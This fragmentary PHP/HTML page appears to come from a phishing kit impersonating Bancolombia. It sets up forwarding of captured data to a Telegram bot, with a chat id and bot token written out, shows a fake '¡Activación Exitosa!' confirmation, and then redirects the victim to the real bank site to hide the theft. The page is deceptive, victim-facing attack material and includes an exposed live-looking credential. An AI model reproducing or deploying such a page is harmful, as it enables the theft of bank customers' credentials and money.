...
$sendtotelegram="yes";
$chat_id="-1001873780312";
$bot_url="6521840440:AAGEvgtA6xG04WD3pr9SwLWPX6mnFOv52Yg";
...
<body onload="actualizarTiempo()">
 ...
 echo date(' h:i:s A '); ?>
            ...
            <div class="center3">
              ...
              <h6 class="">¡Activación Exitosa!</h6>
    ...
    <h2 class="titlex">Seras dirigido a nuestra pagina principal</h2>
                                      <br>
  ...
  <script src="https://code.jquery.com/jquery-1.9.1.min.js"></script>
   ...
   <script language="JavaScript">
      $(document).ready(function() {
          setTimeout("location.href='https://www.bancolombia.com/personas'", 5000);
      });
      </script>
